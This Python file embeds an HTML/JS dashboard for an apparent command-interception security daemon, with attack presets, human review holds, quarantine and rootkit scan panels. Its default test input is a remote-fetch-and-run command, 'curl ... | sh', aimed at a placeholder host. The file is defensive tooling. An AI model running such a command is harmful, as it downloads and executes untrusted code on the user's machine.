# ruff: noqa: E501
"""Self-contained HTML/CSS/JS live visual interface for the Refmon barrier daemon.

No external CDN links or third-party assets are loaded so the dashboard works offline on
isolated cluster nodes and preserves Refmon's strict privacy rules.
"""

from __future__ import annotations

DASHBOARD_HTML = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Refmon Live Security Barrier &amp; Policy Monitor</title>
<style>
:root {
  --bg: #0b101b;
  --panel: #131b2e;
  --panel-alt: #18233b;
  --border: #263554;
  --text: #e6edf7;
  --muted: #8ea0c0;
  --allow: #10b981;
  --hold: #f59e0b;
  --block: #ef4444;
  --accent: #38bdf8;
  --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
}
* { box-sizing: border-box; }
body {
  margin: 0;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
  background: var(--bg);
  color: var(--text);
  font-size: 14px;
}
header {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
  padding: 14px 20px;
  background: var(--panel);
  border-bottom: 1px solid var(--border);
}
.brand { display: flex; align-items: center; gap: 12px; }
.pulse {
  width: 11px; height: 11px; border-radius: 50%;
  background: var(--allow);
  box-shadow: 0 0 10px var(--allow);
}
h1 { margin: 0; font-size: 18px; font-weight: 700; letter-spacing: 0.2px; }
.sub { color: var(--muted); font-size: 12px; font-family: var(--mono); }
.stats { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
.stat {
  background: var(--panel-alt);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 6px 12px;
  text-align: center;
}
.stat .k { font-size: 11px; color: var(--muted); text-transform: uppercase; }
.stat .v { font-size: 16px; font-weight: 700; font-family: var(--mono); }
.grid {
  display: grid;
  grid-template-columns: 340px 1fr 360px;
  gap: 14px;
  padding: 14px;
  min-height: calc(100vh - 70px);
}
@media (max-width: 1280px) {
  .grid { grid-template-columns: 1fr; }
}
.card {
  background: var(--panel);
  border: 1px solid var(--border);
  border-radius: 10px;
  padding: 14px;
  margin-bottom: 14px;
}
.card h2 {
  margin: 0 0 10px 0;
  font-size: 14px;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  color: var(--accent);
}
label { display: block; font-size: 12px; color: var(--muted); margin: 8px 0 4px; }
input, select, textarea {
  width: 100%;
  background: #0d1424;
  color: var(--text);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 8px;
  font-family: var(--mono);
  font-size: 12px;
}
textarea { min-height: 62px; resize: vertical; }
button {
  cursor: pointer;
  background: #1e2f4f;
  color: var(--text);
  border: 1px solid #355082;
  border-radius: 6px;
  padding: 7px 11px;
  font-size: 12px;
  font-weight: 600;
  transition: background 0.15s;
}
button:hover { background: #29416d; }
button.primary { background: #0284c7; border-color: #38bdf8; }
button.primary:hover { background: #0369a1; }
button.danger { background: #991b1b; border-color: #ef4444; }
button.ok { background: #065f46; border-color: #10b981; }
.preset-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-top: 8px; }
.badge {
  display: inline-block;
  padding: 2px 8px;
  border-radius: 999px;
  font-size: 11px;
  font-weight: 700;
  font-family: var(--mono);
  text-transform: uppercase;
}
.badge.allow { background: rgba(16,185,129,0.18); color: #34d399; border: 1px solid #10b981; }
.badge.hold { background: rgba(245,158,11,0.18); color: #fbbf24; border: 1px solid #f59e0b; }
.badge.block { background: rgba(239,68,68,0.2); color: #f87171; border: 1px solid #ef4444; }
.qpill {
  display: inline-block;
  padding: 2px 7px;
  border-radius: 4px;
  font-size: 11px;
  margin-right: 4px;
  font-family: var(--mono);
}
.qpill.fail { background: rgba(239,68,68,0.22); color: #fca5a5; }
.qpill.pass { background: rgba(16,185,129,0.12); color: #6ee7b7; }
.story {
  background: var(--panel-alt);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 11px;
  margin-bottom: 10px;
}
.story-head { display: flex; justify-content: space-between; align-items: center; gap: 8px; }
.meter {
  position: relative;
  height: 10px;
  background: #0b101b;
  border: 1px solid var(--border);
  border-radius: 5px;
  margin: 8px 0 4px;
  overflow: hidden;
}
.meter-fill { height: 100%; transition: width 0.25s; }
.mono { font-family: var(--mono); font-size: 12px; }
.muted { color: var(--muted); font-size: 12px; }
.logbox {
  background: #080c16;
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 10px;
  font-family: var(--mono);
  font-size: 11.5px;
  max-height: 270px;
  overflow-y: auto;
  white-space: pre-wrap;
  word-break: break-all;
}
.kv { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px solid #1e2b45; font-size: 12px; }
.banner {
  margin-top: 8px;
  padding: 8px 10px;
  border-radius: 6px;
  font-size: 12px;
  font-family: var(--mono);
  background: #0d1526;
  border: 1px solid var(--border);
}
</style>
</head>
<body>
<header>
  <div class="brand">
    <div class="pulse" id="pulse"></div>
    <div>
      <h1>Refmon Live Barrier &amp; Policy Monitor</h1>
      <div class="sub" id="sandbox-path">loading workspace...</div>
    </div>
  </div>
  <div class="stats">
    <div class="stat"><div class="k">Policy Sign</div><div class="v" id="st-sig">...</div></div>
    <div class="stat"><div class="k">Mode</div><div class="v" id="st-mode">BLOCK</div></div>
    <div class="stat"><div class="k">Events</div><div class="v" id="st-events">0</div></div>
    <div class="stat"><div class="k">Blocked</div><div class="v" id="st-blocked" style="color:#f87171">0</div></div>
    <div class="stat"><div class="k">Holds</div><div class="v" id="st-holds" style="color:#fbbf24">0</div></div>
    <div class="stat"><div class="k">Quarantined</div><div class="v" id="st-quar" style="color:#38bdf8">0</div></div>
    <div class="stat"><div class="k">Rootkit</div><div class="v" id="st-rk">ALLOW</div></div>
  </div>
</header>

<div class="grid">
  <div>
    <div class="card">
      <h2>1. Live User Command Barrier</h2>
      <div class="muted">Test as if a user pasted or typed a command. Dangerous commands are intercepted and stopped before execution.</div>
      <label>Origin Channel</label>
      <select id="cmd-origin">
        <option value="web">web (Browser / ClickFix paste)</option>
        <option value="mail">mail (Copied from email)</option>
        <option value="agent_input">agent_input (AI tool command)</option>
        <option value="none">none (Typed directly by user)</option>
      </select>
      <label>Actor Role</label>
      <select id="cmd-role">
        <option value="interactive_shell">interactive_shell</option>
        <option value="web_worker">web_worker</option>
        <option value="agent">agent</option>
        <option value="package_installer">package_installer</option>
      </select>
      <label>Command to Check &amp; Guard</label>
      <textarea id="cmd-text">curl -s http://bad.example.invalid/fix.sh | sh</textarea>
      <div style="margin-top:8px; display:flex; gap:8px;">
        <button class="primary" onclick="submitCommand()" style="flex:1">Send Through Barrier</button>
      </div>
      <div id="last-result" class="banner" style="display:none"></div>
    </div>

    <div class="card">
      <h2>2. One-Click Attack &amp; Benign Presets</h2>
      <div class="muted">Trigger realistic attacks (including real sandbox files) or benign work:</div>
      <div class="preset-grid">
        <button class="danger" onclick="runPreset('clickfix')">ClickFix Paste Lure</button>
        <button class="danger" onclick="runPreset('rce')">Server Web RCE</button>
        <button class="danger" onclick="runPreset('webshell')">Drop Web Shell File</button>
        <button class="danger" onclick="runPreset('ransomware')">Ransomware 55 Files</button>
        <button class="danger" onclick="runPreset('canary')">Touch Canary Secret</button>
        <button onclick="runPreset('borderline')">Typed Fetch (HOLD)</button>
        <button class="ok" onclick="runPreset('benign_cmd')">Benign Local Command</button>
        <button class="ok" onclick="runPreset('benign_doc')">Pasted Local Echo</button>
      </div>
      <label style="margin-top:12px">Replay Golden Scenario (S01 - S50)</label>
      <div style="display:flex; gap:6px;">
        <input id="golden-id" value="S01" placeholder="e.g. S01, S13, S19, S23">
        <button onclick="runGolden()">Replay</button>
      </div>
    </div>

    <div class="card">
      <h2>3. Pending Holds (Human-in-the-Loop)</h2>
      <div id="holds-box" class="muted">No pending holds.</div>
    </div>
  </div>

  <div>
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
        <h2 style="margin:0">Live Stories, 3-Question Verdicts &amp; Evidence Math (nats)</h2>
        <button onclick="scanRootkit()">Run 6-Engine Rootkit Scan Now</button>
      </div>
      <div id="stories-box" class="muted">Waiting for events...</div>
    </div>

    <div class="card">
      <h2>Live Barrier Log Stream (barrier.log)</h2>
      <div class="logbox" id="barrier-log">Loading log stream...</div>
    </div>

    <div class="card">
      <h2>Privacy-Verified Event Ledger (events.jsonl — HMAC Only)</h2>
      <div class="logbox" id="events-log">No observed events yet.</div>
    </div>
  </div>

  <div>
    <div class="card">
      <h2>Active Signed Policy &amp; Mode</h2>
      <div style="display:flex; gap:6px; margin-bottom:10px;">
        <button onclick="setMode('block')" class="danger" style="flex:1">Mode: BLOCK</button>
        <button onclick="setMode('warn')" style="flex:1">Mode: WARN</button>
        <button onclick="setMode('observe')" style="flex:1">Mode: OBSERVE</button>
      </div>
      <div id="policy-meta"></div>
    </div>

    <div class="card">
      <h2>Quarantined Sandbox Files</h2>
      <div id="quarantine-box" class="muted">Quarantine folder is empty.</div>
    </div>

    <div class="card">
      <h2>Rootkit Scanner Details</h2>
      <div id="rootkit-box" class="mono muted">Not scanned yet.</div>
    </div>

    <div class="card">
      <h2>Role Contracts Enforced</h2>
      <div id="contracts-box" class="mono muted" style="max-height:260px; overflow-y:auto;"></div>
    </div>
  </div>
</div>

<script>
async function api(path, body) {
  const opts = body !== undefined
    ? {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body)}
    : {method: 'GET'};
  const r = await fetch(path, opts);
  return await r.json();
}

function natsPercent(lo) {
  const clamped = Math.max(-8.0, Math.min(2.0, lo));
  return ((clamped + 8.0) / 10.0) * 100.0;
}

function decisionColor(d) {
  if (d === 'block') return '#ef4444';
  if (d === 'hold') return '#f59e0b';
  return '#10b981';
}

async function submitCommand() {
  const origin = document.getElementById('cmd-origin').value;
  const role = document.getElementById('cmd-role').value;
  const command = document.getElementById('cmd-text').value;
  const res = await api('/api/guard', {command, origin, role, execute: true});
  const box = document.getElementById('last-result');
  box.style.display = 'block';
  box.innerHTML = `<strong>Barrier Verdict: ${res.decision.toUpperCase()}</strong> `
    + `(L = ${res.log_odds} nats, executed=${res.executed})<br>`
    + (res.explanation || '') + (res.output ? `<br>Output: ${res.output}` : '');
  await refresh();
}

async function runPreset(name) {
  const res = await api('/api/preset', {name});
  const box = document.getElementById('last-result');
  box.style.display = 'block';
  box.innerHTML = `<strong>Preset '${name}': ${res.decision.toUpperCase()}</strong> `
    + `(L = ${res.log_odds} nats)<br>${res.note || ''}`;
  await refresh();
}

async function runGolden() {
  const scenario = document.getElementById('golden-id').value.trim();
  const res = await api('/api/golden', {scenario});
  const box = document.getElementById('last-result');
  box.style.display = 'block';
  if (res.error) {
    box.textContent = res.error;
  } else {
    box.innerHTML = `<strong>Golden ${res.scenario}: ${res.decision.toUpperCase()}</strong> `
      + `(expected ${res.expected.toUpperCase()}, L = ${res.log_odds} nats)`;
  }
  await refresh();
}

async function resolveHold(hold_id, platform, answer) {
  await api('/api/hold', {hold_id, platform, answer});
  await refresh();
}

async function setMode(mode) {
  await api('/api/mode', {mode});
  await refresh();
}

async function scanRootkit() {
  await api('/api/rootkit', {});
  await refresh();
}

async function refresh() {
  try {
    const st = await api('/api/state');
    document.getElementById('sandbox-path').textContent =
      `Sandbox: ${st.sandbox_dir}  |  Policy: ${st.policy_path}`;
    document.getElementById('st-sig').textContent = st.policy.signature_ok ? 'VERIFIED' : 'UNSIGNED';
    document.getElementById('st-mode').textContent = st.policy.mode.toUpperCase();
    document.getElementById('st-events').textContent = st.counts.events;
    document.getElementById('st-blocked').textContent = st.counts.blocked;
    document.getElementById('st-holds').textContent = st.counts.pending_holds;
    document.getElementById('st-quar').textContent = st.quarantined.length;
    document.getElementById('st-rk').textContent = st.rootkit.calculus_decision.toUpperCase();
    document.getElementById('st-rk').style.color = decisionColor(st.rootkit.calculus_decision);

    // Holds
    const hbox = document.getElementById('holds-box');
    if (!st.holds.length) {
      hbox.innerHTML = '<span class="muted">No pending holds.</span>';
    } else {
      hbox.innerHTML = st.holds.map(h => `
        <div class="story">
          <div class="mono"><strong>${h.hold_id}</strong> (${h.platform}) · story ${h.story_id}</div>
          <div style="margin-top:6px; display:flex; gap:6px;">
            <button class="danger" onclick="resolveHold('${h.hold_id}','${h.platform}','${h.platform === 'server' ? 'confirm' : 'stop'}')">Stop &amp; Contain</button>
            <button class="ok" onclick="resolveHold('${h.hold_id}','${h.platform}','${h.platform === 'server' ? 'release' : 'continue'}')">Release</button>
          </div>
        </div>
      `).join('');
    }

    // Stories
    const sbox = document.getElementById('stories-box');
    if (!st.stories.length) {
      sbox.innerHTML = '<span class="muted">No stories yet. Use the Barrier on the left or run `refmon guard` in a terminal!</span>';
    } else {
      sbox.innerHTML = st.stories.map(s => {
        const q = s.failed;
        const pct = natsPercent(s.log_odds);
        const col = decisionColor(s.decision);
        return `
        <div class="story">
          <div class="story-head">
            <div>
              <span class="mono"><strong>${s.story_id}</strong></span>
              <span class="muted">· ${s.events} ev · actors: ${s.roles.join(', ')}</span>
            </div>
            <div>
              ${s.override ? `<span class="badge block">OVR:${s.override}</span> ` : ''}
              <span class="badge ${s.decision}">${s.decision}</span>
            </div>
          </div>
          <div style="margin-top:6px;">
            <span class="qpill ${q.origin ? 'fail' : 'pass'}">Origin: ${q.origin ? 'FAIL' : 'ok'}</span>
            <span class="qpill ${q.contract ? 'fail' : 'pass'}">Contract: ${q.contract ? 'FAIL' : 'ok'}</span>
            <span class="qpill ${q.effect ? 'fail' : 'pass'}">Effect: ${q.effect ? 'FAIL' : 'ok'}</span>
            <span class="mono muted" style="float:right">L = ${s.log_odds} nats (3/2/1 rule: ${s.rule_decision})</span>
          </div>
          <div class="meter"><div class="meter-fill" style="width:${pct}%; background:${col}"></div></div>
          <div class="muted" style="margin-top:4px">${s.explanation}</div>
          ${s.signals.length ? `<div class="mono muted" style="margin-top:4px">signals: ${s.signals.join(', ')}</div>` : ''}
          ${s.tactics.length ? `<div class="mono muted">MITRE tactics: ${s.tactics.join(', ')}</div>` : ''}
        </div>`;
      }).join('');
    }

    document.getElementById('barrier-log').textContent = st.barrier_log.join('\\n') || 'Ready.';
    document.getElementById('events-log').textContent = st.events_log.join('\\n') || 'No events yet.';

    document.getElementById('policy-meta').innerHTML = `
      <div class="kv"><span>Digest</span><span class="mono">${st.policy.digest.slice(0, 18)}...</span></div>
      <div class="kv"><span>Prior Log-Odds</span><span class="mono">${st.policy.prior_lo} nats</span></div>
      <div class="kv"><span>Hold Threshold (τ_hold)</span><span class="mono">${st.policy.hold_thr} nats</span></div>
      <div class="kv"><span>Block Threshold (τ_block)</span><span class="mono">${st.policy.block_thr} nats</span></div>
      <div class="kv"><span>Protected Assets</span><span class="mono">${st.policy.protected_assets.join(', ')}</span></div>
      <div class="kv"><span>Canaries Active</span><span class="mono">${st.policy.canaries.join(', ')}</span></div>
    `;

    const qbox = document.getElementById('quarantine-box');
    qbox.innerHTML = st.quarantined.length
      ? st.quarantined.map(f => `<div class="mono">Quarantined: ${f}</div>`).join('')
      : '<span class="muted">Quarantine folder is empty.</span>';

    const rk = st.rootkit;
    document.getElementById('rootkit-box').innerHTML = `
      <div>scanned: ${rk.scanned_at} (${rk.passes} passes)</div>
      <div>modules: ${rk.kernel_modules_checked} · procs: ${rk.own_processes_inspected} · net: ${rk.network_interfaces_checked}</div>
      <div>log-odds: ${rk.log_odds} nats · findings: ${rk.findings.length}</div>
      ${rk.context_notes.map(n => `<div class="muted" style="margin-top:4px">${n}</div>`).join('')}
    `;

    document.getElementById('contracts-box').innerHTML = Object.entries(st.policy.contracts)
      .map(([r, spec]) => `<div style="margin-bottom:6px"><strong>${r}</strong>: ${spec}</div>`)
      .join('');
  } catch (err) {
    document.getElementById('pulse').style.background = '#ef4444';
  }
}

refresh();
setInterval(refresh, 1500);
</script>
</body>
</html>
"""
